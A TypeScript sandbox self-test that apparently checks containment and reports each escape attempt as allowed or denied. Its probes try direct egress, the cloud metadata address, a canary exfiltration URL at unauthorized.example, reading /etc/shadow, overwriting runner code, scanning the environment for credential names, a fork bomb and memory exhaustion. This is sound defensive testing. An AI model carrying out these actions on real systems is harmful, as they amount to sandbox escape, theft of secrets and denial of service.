import { spawn } from "node:child_process";
import { existsSync, readFileSync, writeFileSync } from "node:fs";
import http from "node:http";
import net from "node:net";
import type { LabProbe } from "@inlet/domain";

type Probe = Omit<LabProbe, "t">;

const SELECTED_PROBE = process.argv[2] ?? "";
const proxyHost = process.env.INLET_PROXY_HOST ?? "";
const proxyPort = Number(process.env.INLET_PROXY_PORT ?? 3128);
const controlPort = Number(process.env.INLET_CONTROL_PORT ?? 3191);
const allowedHost = process.env.INLET_ALLOWED_HOST ?? "";
const allowedPort = Number(process.env.INLET_ALLOWED_PORT ?? 0);

function emit(result: Probe): void {
  process.stdout.write(`${JSON.stringify({ t: "probe_result", ...result })}\n`);
}

function tcpAttempt(host: string, port: number, timeoutMs = 4_000): Promise<{ connected: boolean; code: string }> {
  return new Promise((resolve) => {
    const socket = net.connect({ host, port });
    const done = (connected: boolean, code: string) => {
      socket.destroy();
      resolve({ connected, code });
    };
    socket.setTimeout(timeoutMs, () => done(false, "ETIMEDOUT"));
    socket.once("connect", () => done(true, "connected"));
    socket.once("error", (error: NodeJS.ErrnoException) => done(false, error.code ?? "error"));
  });
}

function proxyRequest(targetUrl: string): Promise<{ status: number; marker: string | undefined }> {
  return new Promise((resolve, reject) => {
    const request = http.request(
      { host: proxyHost, port: proxyPort, method: "GET", path: targetUrl, headers: { host: new URL(targetUrl).host }, timeout: 8_000 },
      (response) => {
        response.resume();
        resolve({ status: response.statusCode ?? 0, marker: response.headers["x-inlet-egress"] as string | undefined });
      },
    );
    request.on("timeout", () => request.destroy(new Error("timeout")));
    request.on("error", reject);
    request.end();
  });
}

async function blockedNetwork(): Promise<void> {
  const direct = await tcpAttempt("1.1.1.1", 443);
  emit({
    probe: "direct-tcp-egress",
    attempted: "Open a TCP connection straight to 1.1.1.1:443, bypassing the gateway",
    outcome: direct.connected ? "allowed" : "denied",
    detail: direct.connected ? "A direct connection succeeded." : "The sandbox network has no route to the internet.",
    exitStatus: direct.code,
  });

  const metadata = await tcpAttempt("169.254.169.254", 80);
  emit({
    probe: "cloud-metadata",
    attempted: "Reach the cloud metadata address 169.254.169.254:80",
    outcome: metadata.connected ? "allowed" : "denied",
    detail: metadata.connected ? "The metadata address accepted a connection." : "The metadata address is unreachable.",
    exitStatus: metadata.code,
  });

  const control = await tcpAttempt(proxyHost, controlPort);
  emit({
    probe: "gateway-control-port",
    attempted: `Reach the gateway control port from inside the sandbox (${proxyHost}:${controlPort})`,
    outcome: control.connected ? "allowed" : "denied",
    detail: control.connected ? "The control port accepted a connection." : "The control API is not exposed on the sandbox network.",
    exitStatus: control.code,
  });

  try {
    const denied = await proxyRequest("http://unauthorized.example/collect?secret=INLET_CANARY");
    emit({
      probe: "unapproved-host-via-gateway",
      attempted: "Ask the egress gateway for http://unauthorized.example/collect",
      outcome: denied.status === 403 && denied.marker === "denied" ? "denied" : "allowed",
      detail: `Gateway responded with status ${denied.status}.`,
      exitStatus: `HTTP ${denied.status}`,
    });
  } catch (error) {
    emit({
      probe: "unapproved-host-via-gateway",
      attempted: "Ask the egress gateway for http://unauthorized.example/collect",
      outcome: "error",
      detail: error instanceof Error ? error.message : "request failed",
    });
  }

  if (allowedHost) {
    try {
      const allowed = await proxyRequest(`http://${allowedHost}:${allowedPort}/contact`);
      emit({
        probe: "positive-control",
        attempted: `Request the authorized test site through the gateway (${allowedHost}:${allowedPort})`,
        outcome: allowed.status === 200 ? "allowed" : "error",
        detail: `Gateway forwarded the request. Status ${allowed.status}.`,
        exitStatus: `HTTP ${allowed.status}`,
      });
    } catch (error) {
      emit({
        probe: "positive-control",
        attempted: `Request the authorized test site through the gateway (${allowedHost}:${allowedPort})`,
        outcome: "error",
        detail: error instanceof Error ? error.message : "request failed",
      });
    }
  }
}

function attemptFile(probe: string, attempted: string, action: () => string): void {
  try {
    const detail = action();
    emit({ probe, attempted, outcome: "allowed", detail, exitStatus: "ok" });
  } catch (error) {
    const code = (error as NodeJS.ErrnoException).code ?? "error";
    emit({ probe, attempted, outcome: "denied", detail: `The operating system refused: ${code}.`, exitStatus: code });
  }
}

function forbiddenFile(): void {
  attemptFile("write-root-filesystem", "Write to /etc/inlet-pwned on the root filesystem", () => {
    writeFileSync("/etc/inlet-pwned", "x");
    return "Wrote to the root filesystem.";
  });
  attemptFile("write-application-code", "Overwrite the runner code at /runner/main.mjs", () => {
    writeFileSync("/runner/main.mjs", "//");
    return "Overwrote the runner.";
  });
  attemptFile("read-shadow", "Read /etc/shadow", () => {
    readFileSync("/etc/shadow");
    return "Read /etc/shadow.";
  });
  const socket = existsSync("/var/run/docker.sock");
  emit({
    probe: "docker-socket",
    attempted: "Look for the container engine socket at /var/run/docker.sock",
    outcome: socket ? "allowed" : "denied",
    detail: socket ? "The container engine socket is present." : "No container engine socket exists inside the sandbox.",
    exitStatus: socket ? "present" : "ENOENT",
  });
  const leaked = Object.keys(process.env).filter((key) => /KEY|SECRET|TOKEN|PASSWORD|DATABASE_URL/i.test(key));
  emit({
    probe: "environment-secrets",
    attempted: "List environment variables that look like credentials",
    outcome: leaked.length > 0 ? "allowed" : "denied",
    detail: leaked.length > 0 ? `Found ${leaked.join(", ")}.` : "The sandbox environment holds no credentials.",
    exitStatus: `${leaked.length} found`,
  });
}

async function resourceExhaustion(): Promise<void> {
  const script = "while :; do sleep 30 & done";
  const pids = await new Promise<{ spawned: boolean; detail: string }>((resolve) => {
    const child = spawn("sh", ["-c", script], { stdio: ["ignore", "ignore", "pipe"] });
    let stderr = "";
    child.stderr.on("data", (chunk: Buffer) => {
      stderr += chunk.toString();
      if (/fork|resource|retry|cannot/i.test(stderr)) {
        child.kill("SIGKILL");
        resolve({ spawned: false, detail: stderr.split("\n")[0]?.slice(0, 200) ?? "fork failed" });
      }
    });
    setTimeout(() => {
      child.kill("SIGKILL");
      resolve({ spawned: true, detail: "Process creation was not limited within 6 seconds." });
    }, 6_000);
  });
  emit({
    probe: "pid-limit",
    attempted: "Spawn processes in an unbounded loop",
    outcome: pids.spawned ? "allowed" : "denied",
    detail: pids.detail,
    exitStatus: pids.spawned ? "unbounded" : "EAGAIN",
  });
  emit({
    probe: "memory-limit-start",
    attempted: "Allocate memory until the limit is reached. The container should be killed by the kernel.",
    outcome: "error",
    detail: "Allocation started. A controller record of the exit reason follows.",
  });
  const chunks: Buffer[] = [];
  for (;;) {
    chunks.push(Buffer.alloc(16 * 1024 * 1024, 1));
    await new Promise((resolve) => setTimeout(resolve, 15));
  }
}

const probes: Record<string, () => Promise<void> | void> = {
  "blocked-network": blockedNetwork,
  "forbidden-file": forbiddenFile,
  "resource-exhaustion": resourceExhaustion,
};

const selected = probes[SELECTED_PROBE];
if (!selected) process.exit(2);

Promise.resolve(selected())
  .then(() => process.exit(0))
  .catch((error: unknown) => {
    process.stderr.write(`${error instanceof Error ? error.message : String(error)}\n`);
    process.exit(1);
  });
